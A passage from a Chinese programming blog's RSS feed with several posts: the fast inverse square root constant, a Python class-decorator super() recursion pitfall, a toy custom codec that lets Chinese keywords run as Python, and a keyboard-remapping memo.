<code>5f375a86</code>，并通过实测证实了他的想法。但此常数只是以毫厘之差险胜原算法（一次迭代 $0.175228$ vs $0.175124$，二次迭代 $4.66 \times 10^{-4}$ vs $4.65437 \times 10^{-4}$）。Lomont 在论文中表达了他的惊讶，这个实验同时也使那位不知名的作者（传闻说是 Quake 的作者 Carmack，然而他自己不承认）更加扑朔迷离。</p><h2 id="总结--推广">总结 &amp; 推广</h2><p >这个算法的核心其实很简单：先使用某种手段近似估计解，再用牛顿法迭代增加精确度。同时，它也启示我们： <strong>浮点数表示和对数之间存在某种联系</strong>，而对数恰是我们简化计算的利器。</p><p >按照这个思路，我们可以拓展出立方根倒数的对应算法，也可以将 32 位算法改写为 64 位（Lomont 在他的论文中提供了 64 位的常数 <code>0x5fe6ec85e7de30da</code>）。现如今，这些算法的加速效应已经不太明显了，但深入剖析上古神话背后的理论，也未尝不是件有趣的事。</p><blockquote><p >也许他真的是神</p></blockquote><h2 id="参考文献">参考文献</h2><ul><li><a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">Fast inverse square root - Wikipedia</a></li><li><a href="http://www.lomont.org/Math/Papers/2003/InvSqrt.pdf">FAST INVERSE SQUARE ROOT - CHRIS LOMONT</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Fast-Inverse-Square-Root-Algorithm/">Fast Inverse Square Root Algorithm</category>
      
      
      <comments>https://i.hsfzxjy.site/uncover-the-secret-of-fast-inverse-square-root-algorithm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>神坑·Python 装饰类无限递归</title>
      <link>https://i.hsfzxjy.site/recursively-calling-when-decorating-a-python-class/</link>
      <guid>https://i.hsfzxjy.site/recursively-calling-when-decorating-a-python-class/</guid>
      <pubDate>Fri, 29 Jul 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p &gt;《神坑》系列将会不定期更新一些可遇而不可求的坑
防止他人入坑，也防止自己再次入坑&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;简化版问题&quot;&gt;简化版问题&lt;/h2&gt;
&lt;p &gt;现有两个 &lt;code&gt;View&lt;/code&gt; 类：&lt;/p&gt;
&lt;div</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p >《神坑》系列将会不定期更新一些可遇而不可求的坑防止他人入坑，也防止自己再次入坑</p></blockquote><h2 id="简化版问题">简化版问题</h2><p >现有两个 <code>View</code> 类：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">View</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-comment"># Do something...</span></span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildView</span>(<span class="hljs-title class_ inherited__">View</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-comment"># Do something else ...</span></span><br><span class="line">        <span class="hljs-built_in">super</span>(ChildView, self).method()</span><br></pre></div></div><p >以及一个用于修饰该类的装饰器函数 <code>register</code>——用于装饰类的装饰器很常见（如 <code>django.contrib.admin</code> 的 <code>register</code>），通常可极大地减少定义相似类时的工作量：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mixin</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">cls</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(</span><br><span class="line">        <span class="hljs-string">&#x27;DecoratedView&#x27;</span>,</span><br><span class="line">        (Mixin, cls),</span><br><span class="line">        {}</span><br><span class="line">    )</span><br></pre></div></div><p >这个装饰器为被装饰类附加上一个额外的父类 <code>Mixin</code>，以增添自定义的功能。</p><p >完整的代码如下：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mixin</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">cls</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(</span><br><span class="line">        cls.__name__,</span><br><span class="line">        (Mixin, cls),</span><br><span class="line">        {}</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">View</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-comment"># Do something...</span></span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@register</span></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildView</span>(<span class="hljs-title class_ inherited__">View</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-comment"># Do something else ...</span></span><br><span class="line">        <span class="hljs-built_in">super</span>(ChildView, self).method()</span><br></pre></div></div><p >看上去似乎没什么问题。然而一旦调用 <code>View().method()</code>，却会报出诡异的 无限递归 错误：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># ...</span></span><br><span class="line">File <span class="hljs-string">&quot;test.py&quot;</span>, line <span class="hljs-number">23</span>, <span class="hljs-keyword">in</span> method</span><br><span class="line">  <span class="hljs-built_in">super</span>(ChildView, self).method()</span><br><span class="line">File <span class="hljs-string">&quot;test.py&quot;</span>, line <span class="hljs-number">23</span>, <span class="hljs-keyword">in</span> method</span><br><span class="line">  <span class="hljs-built_in">super</span>(ChildView, self).method()</span><br><span class="line">File <span class="hljs-string">&quot;test.py&quot;</span>, line <span class="hljs-number">23</span>, <span class="hljs-keyword">in</span> method</span><br><span class="line">  <span class="hljs-built_in">super</span>(ChildView, self).method()</span><br><span class="line">RuntimeError: maximum recursion depth exceeded <span class="hljs-keyword">while</span> calling a Python <span class="hljs-built_in">object</span></span><br></pre></div></div><p >【一脸懵逼】</p><h2 id="猜想--验证">猜想 &amp; 验证</h2><p >从 Traceback 中可以发现：是 <code>super(ChildView, self).method()</code> 在不停地调用自己——这着实让我吃了一惊，因为 <strong>按理说 <code>super</code> 应该沿着继承链查找父类</strong>，可为什么在这里 <code>super</code> 神秘地失效了呢？</p><p >为了验证 <code>super(...).method</code> 的指向，可以尝试将该语句改为 <code>print(super(ChildView, self).method)</code>，并观察结果：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">&lt;bound method ChildView.method of &lt;__main__.ChildView <span class="hljs-built_in">object</span> at <span class="hljs-number">0xb70fec6c</span>&gt;&gt;</span><br></pre></div></div><p >输出表明： <strong><code>method</code> 的指向确实有误</strong>，此处本应为 <code>View.method</code>。</p><p ><code>super</code> 是 python 内置方法，肯定不会出错。那，会不会是 <code>super</code> 的参数有误呢？</p><p ><code>super</code> 的签名为 <code>super(cls, instance)</code>，宏观效果为 <strong>遍历 <code>cls</code> 的继承链查找父类方法，并以 <code>instance</code> 作为 <code>self</code> 进行调用</strong>。如今查找结果有误，说明 <strong>继承链是错误的</strong>，因而极有可能是 <code>cls</code> 出错。</p><p >因此，有必要探测一下 <code>ChildView</code> 的指向。在 <code>method</code> 中加上一句： <code>print(ChildView)</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.DecoratedView&#x27;</span>&gt;</span><br></pre></div></div><p >原来，作用域中的 <code>ChildView</code> 已经被改变了。</p><h2 id="真相">真相</h2><p >一切都源于装饰器语法糖。我们回忆一下装饰器的等价语法：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">@decorator</span></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Class</span>:</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br></pre></div></div><p >等价于</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Class</span>:</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line">Class = decorator(Class)</span><br></pre></div></div><p >这说明：<strong>装饰器会更改该作用域内被装饰名称的指向</strong>。</p><p >这本来没什么，但和 <code>super</code> 一起使用时却会出问题。通常情况下我们会将本类的名称传给 <code>super</code>（在这里为 <code>ChildView</code>），而本类名称和装饰器语法存在于同一作用域中，从而在装饰时被一同修改了（在本例中指向了子类 <code>DecoratedView</code>），进而使 <code>super(...).method</code> 指向了 <code>DecoratedView</code> 的最近祖先也就是 <code>ChildView</code> 自身的 <code>method</code> 方法，导致递归调用。</p><h2 id="解决方案">解决方案</h2><p >找到了病因，就不难想到解决方法了。核心思路就是：<strong>不要更改被装饰名称的引用</strong>。</p><p >如果你只是想在内部使用装饰后的新类，可以在装饰器方法中使用 <code>DecoratedView</code>，而在装饰器返回时 <code>return cls</code>，以保持引用不变：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">cls</span>):</span><br><span class="line"></span><br><span class="line">    decorated = <span class="hljs-built_in">type</span>(</span><br><span class="line">        <span class="hljs-string">&#x27;DecoratedView&#x27;</span>,</span><br><span class="line">        (Mixin, cls),</span><br><span class="line">        {}</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># Do something with decorated</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> cls</span><br></pre></div></div><p >这种方法的缺点是：从外部无法使用 <code>ChildView.another_method</code> 调用 <code>Mixin</code> 上的方法。可如果真的有这样的需求，可以采用另一个解决方案：</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">cls</span>):</span><br><span class="line"></span><br><span class="line">    cls.another_method = Mixin.another_method</span><br><span class="line">    <span class="hljs-keyword">return</span> cls</span><br></pre></div></div><p >即通过赋值的方式为 <code>cls</code> 添加 <code>Mixin</code> 上的新方法，缺点是较为繁琐。</p><p >两种方法各有利弊，要根据实际场景权衡使用。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Decorator-Pattern/">Decorator Pattern</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Infinite-Recursion/">Infinite Recursion</category>
      
      
      <comments>https://i.hsfzxjy.site/recursively-calling-when-decorating-a-python-class/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python“黑魔法”之 Encoding &amp; Decoding</title>
      <link>https://i.hsfzxjy.site/python-encoding-and-decoding/</link>
      <guid>https://i.hsfzxjy.site/python-encoding-and-decoding/</guid>
      <pubDate>Wed, 20 Jul 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;写在前面-2&quot;&gt;写在前面&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;本文为科普文&lt;/li&gt;
&lt;li&gt;本文中的例子在 Ubuntu 14.04 / Python 2.7.11 下运行成功，Python 3+ 的接口有些许不同，需要读者自行转换&lt;/li&gt;
</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="写在前面-2">写在前面</h2><blockquote><ul><li>本文为科普文</li><li>本文中的例子在 Ubuntu 14.04 / Python 2.7.11 下运行成功，Python 3+ 的接口有些许不同，需要读者自行转换</li></ul></blockquote><h2 id="引子-3">引子</h2><p >先看一段代码：</p><p ><code>example.py</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"># -*- conding=yi -*-</span><br><span class="line"></span><br><span class="line">从 math 导入 sin, pi</span><br><span class="line"></span><br><span class="line">打印 &#x27;sin(pi) =&#x27;, sin(pi)</span><br></pre></div></div><p >这是什么？！是 Python 吗？可以运行吗？——想必你会问。</p><p >我可以明确告诉你：这不是 Python，<strong>但它可以用 Python 解释器运行</strong>。当然，如果你愿意，可以叫它“Yython” （易语言 + Python）。</p><p ><img loading="lazy" src="//sf.gg/img/bVzuHw" alt=""></p><p >怎么做到的？也许你已经注意到第一行的奇怪注释——没错，秘密全在这里。</p><p >这种黑魔法，还要从 <a href="https://www.python.org/dev/peps/pep-0263/">PEP 263</a> 说起。</p><h2 id="古老的-pep-263">古老的 PEP 263</h2><p >我相信 99% 的中国 Python 开发者都曾经为一个问题而头疼——字符编码。那是每个初学者的梦靥。</p><p >还记得那天吗？当你试图用代码向它示好：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;你好&#x27;</span></span><br></pre></div></div><p >它却给你当头一棒：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">SyntaxError: Non-ASCII character &#x27;\xe4&#x27; in file chi.py on line 1, but no enconding declared</span><br></pre></div></div><p >【一脸懵逼】</p><p >于是，你上网查找解决方案。很快，你便有了答案：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># -*- conding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;你好&#x27;</span></span><br></pre></div></div><p >其中第一行的注释用于指定解析该文件的编码。</p><p >这个特新来自 2001 年的 <a href="https://www.python.org/dev/peps/pep-0263/">PEP 263 – Defining Python Source Code Encondings</a>，它的出现是为了解决一个反响广泛的问题：</p><blockquote><p >In Python 2.1, Unicode literals can only be written using the</p></blockquote><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">Latin-1 based enconding &quot;unicode-escape&quot;. This makes the</span><br><span class="line">programming environment rather unfriendly to Python users who live</span><br><span class="line">and work in non-Latin-1 locales such as many of the Asian</span><br><span class="line">countries. Programmers can write their 8-bit strings using the</span><br><span class="line">favorite enconding, but are bound to the &quot;unicode-escape&quot; enconding</span><br><span class="line">for Unicode literals.</span><br></pre></div></div><p >Python 默认用 ASCII 编码解析文件，给 15 年前的非英文世界开发者造成了不小的困扰——看来 Guido 老爹有些个人主义，设计时只考虑到了英文世界。</p><p >提案者设想：<strong>使用一种特殊的文件首注释，用于指定代码的编码</strong>。这个注释的正则原型是这样的：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">^[ \t\v]*#.*?conding[:=][ \t]*([-_.a-zA-Z0-9]+)</span><br></pre></div></div><p >也就是说 <code># -*- conding=utf-8 -*-</code> 并不是唯一的写法，只是 Emacs 推荐写法而已。诸如 <code># conding=utf-8</code>、<code># enconding: utf-8</code> 都是合法的——因此你不必惊讶于他人编码声明与你不同。</p><p >正则的捕获组 <code>([-_.a-zA-Z0-9]+)</code> 将会被用作查找编码的名称，查找到的编码信息会被用于解码文件。也就是说，<code>import example</code> 背后其实相当于有如下转换过程：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;example.py&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    enconding = extract_enconding_info(content) <span class="hljs-comment"># 解析首注释</span></span><br><span class="line">    <span class="hljs-built_in">exec</span>(content.decode(enconding))</span><br></pre></div></div><p >问题其实又回到我们常用的 <code>str.encode</code> 和 <code>str.decode</code> 上来了。</p><p >可 Python 怎么这么强大？！几乎所有编码它都认得！这是怎么做到的？是标准库？还是内置于解释器中？</p><p >一切，都是 <code>codecs</code> 模块在起作用。</p><h2 id="codecs">codecs</h2><p ><code>codecs</code> 算是较为冷门的一个模块，更为常用的是 <code>str</code> 的 <code>encode</code>/<code>decode</code> 的方法——但它们本质都是对 <code>codecs</code> 的调用。</p><p >打开 <code>/path/to/your/python/lib/encondings/</code> 目录，你会发现有许多以编码名称命名的 <code>.py</code> 文件，如 <code>utf_8.py</code>、<code>latin_1.py</code>。这些都是系统预定义的编码系统，实现了应对各种编码的逻辑——也就是说：编码系统其实也是普通的模块。</p><p >除了内置的编码，用户也可以 <strong>自行定义编码系统</strong>。<code>codecs</code> 暴露了一个 <code>register</code> 函数，用于注册自定义编码。<code>register</code> 签名如下：</p><blockquote><p ><strong>codecs.register(search_function)</strong>Register a codec search function. Search functions are expected to take one argument, the enconding name in all lower case letters, and return a CodecInfo object having the following attributes:</p></blockquote><ul><li>name: The name of the enconding;</li><li>encode: The stateless enconding function;</li><li>decode: The stateless deconding function;</li><li>incrementalencoder: An incremental encoder class or factory function;</li><li>incrementaldecoder: An incremental decoder class or factory function;</li><li>streamwriter: A stream writer class or factory function;</li><li>streamreader: A stream reader class or factory function.</li></ul><p ><code>encode</code> 和 <code>decode</code> 是无状态的编码/解码的函数，简单说就是：前一个被编解码的字符串与后一个没有关联。如果你想用 <code>codecs</code> 系统进行语法树解析，解析逻辑最好不要写在这里，因为代码的连续性无法被保证；<code>incremental*</code> 则是有状态的解析类，能弥补 <code>encode</code>、<code>decode</code> 的不足；<code>stream*</code> 是流相关的解析类，行为通常与 <code>encode</code>/<code>decode</code> 相同。</p><p >关于这六个对象的具体写法，可以参考 <code>/path/to/your/python/lib/encondings/rot_13.py</code>，该文件实现了一个简单的密码系统。</p><p >那么，是时候揭开真相了。</p><h2 id="所谓的yython">所谓的“Yython”</h2><p >黑魔法其实并不神秘，照猫画虎定义好相应的接口即可。作为例子，这里只处理用到的关键字：</p><p ><code>yi.py</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># enconding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">yi_map = {</span><br><span class="line">    <span class="hljs-string">u&#x27;从&#x27;</span>: <span class="hljs-string">&#x27;from&#x27;</span>,</span><br><span class="line">    <span class="hljs-string">u&#x27;导入&#x27;</span>: <span class="hljs-string">&#x27;import&#x27;</span>,</span><br><span class="line">    <span class="hljs-string">u&#x27;打印&#x27;</span>: <span class="hljs-string">&#x27;print&#x27;</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params"><span class="hljs-built_in">input</span></span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> yi_map.items():</span><br><span class="line">        <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.replace(value, key)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span>.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params"><span class="hljs-built_in">input</span></span>):</span><br><span class="line">    <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> yi_map.items():</span><br><span class="line">        <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.replace(key, value)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Codec</span>(codecs.Codec):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>, errors=<span class="hljs-string">&quot;strict&quot;</span></span>):</span><br><span class="line">        <span class="hljs-built_in">input</span> = encode(<span class="hljs-built_in">input</span>)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">input</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>))</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>, errors=<span class="hljs-string">&quot;strict&quot;</span></span>):</span><br><span class="line">        <span class="hljs-built_in">input</span> = decode(<span class="hljs-built_in">input</span>)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">input</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">IncrementalEncoder</span>(codecs.IncrementalEncoder):</span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>, final=<span class="hljs-literal">False</span></span>):</span><br><span class="line">        <span class="hljs-keyword">return</span> encode(<span class="hljs-built_in">input</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">IncrementalDecoder</span>(codecs.IncrementalDecoder):</span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>, final=<span class="hljs-literal">False</span></span>):</span><br><span class="line">        <span class="hljs-keyword">return</span> decode(<span class="hljs-built_in">input</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">StreamWriter</span>(Codec, codecs.StreamWriter):</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">StreamReader</span>(Codec, codecs.StreamReader):</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register_entry</span>(<span class="hljs-params">enconding</span>):</span><br><span class="line">    <span class="hljs-keyword">return</span> codecs.CodecInfo(</span><br><span class="line">        name=<span class="hljs-string">&#x27;yi&#x27;</span>,</span><br><span class="line">        encode=Codec().encode,</span><br><span class="line">        decode=Codec().decode,</span><br><span class="line">        incrementalencoder=IncrementalEncoder,</span><br><span class="line">        incrementaldecoder=IncrementalDecoder,</span><br><span class="line">        streamwriter=StreamWriter,</span><br><span class="line">        streamreader=StreamReader</span><br><span class="line">    ) <span class="hljs-keyword">if</span> enconding == <span class="hljs-string">&#x27;yi&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span></span><br></pre></div></div><p >在命令行里注册一下，就可以看到激动人心的结果了：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> codecs, yi</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>codecs.register(yi.register_entry)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> example</span><br><span class="line">sin(pi) = <span class="hljs-number">1.22464679915e-16</span></span><br></pre></div></div><h2 id="结语-1">结语</h2><p >有时，对习以为常的东西深入了解一下，说不定会有惊人的发现。</p><h2 id="references-1">References</h2><ul><li><a href="https://docs.python.org/2.7/library/codecs.html">codecs - Codec registry and base classes</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      
      <comments>https://i.hsfzxjy.site/python-encoding-and-decoding/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 重新映射键盘布局</title>
      <link>https://i.hsfzxjy.site/alternative-key-maps-under-ubuntu/</link>
      <guid>https://i.hsfzxjy.site/alternative-key-maps-under-ubuntu/</guid>
      <pubDate>Sun, 05 Jun 2016 09:20:26 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;键盘持续失灵，已经到了让我忍无可忍的地步了。&lt;/p&gt;
&lt;p &gt;刚开始只是方向键失灵，好在可以用小键盘替代；后来右 Ctrl 和 Alt 也失灵了，好在可以用左边的替代；直到最近 Fn 键也失灵了，终于逼疯了我——因为这意味着 F1 ～ F12 都将不能使用。&lt;/p&gt;
&lt;p</description>
        
      
      
      
      <content:encoded><![CDATA[<p >键盘持续失灵，已经到了让我忍无可忍的地步了。</p><p >刚开始只是方向键失灵，好在可以用小键盘替代；后来右 Ctrl 和 Alt 也失灵了，好在可以用左边的替代；直到最近 Fn 键也失灵了，终于逼疯了我——因为这意味着 F1 ～ F12 都将不能使用。</p><p >我曾试图寻找方法将 CapsLock 键映射为 Fn 键映射，但失败了——Fn 键消息是由 BIOS 拦截的，无法被操作系统捕获。</p><p >但今天我找到了一个更好的替代方案：</p><ul><li>交换 Fn 和 Ctrl。这是唯一一种能让 Fn 键移位的方式，在所有的 BIOS 中都可以设置。</li><li>将 CapsLock 映射为 Ctrl。反正 CapsLock 闲着也是闲着，不如用它代替坏了的键。</li></ul><p >ubuntu 下需要执行：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">setxkbmap -layout us -option ctrl:nocaps</span><br></pre></div></div><p  class="par"> 参考： <a href="http://askubuntu.com/questions/462021/how-do-i-turn-caps-lock-into-an-extra-control-key">How do I turn Caps Lock into an extra Control key? - Ask Ubuntu</a></p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/alternative-key-maps-under-ubuntu/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>为什么我要翻墙</title>
      <link>https://i.hsfzxjy.site/why-I-choose-to-climb-over-the-wall/</link>
      <guid>https://i.hsfzxjy.site/why-I-choose-to-climb-over-the-wall/</guid>
      <pubDate>Fri, 08 Apr 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;很多人不解为什么我要翻墙。他们认为，国家明令禁止的东西就不应该去做——而更何况，墙内的世界已经足够精彩，异世界的天空也不一定令人神往。&lt;/p&gt;
&lt;p &gt;在中国大陆，能上网的人被分为两类：翻墙的 与 不翻墙的。这里说的“翻墙”不是“有能力翻墙”，而是“有意愿翻墙”。这两类人</description>
        
      
      
      
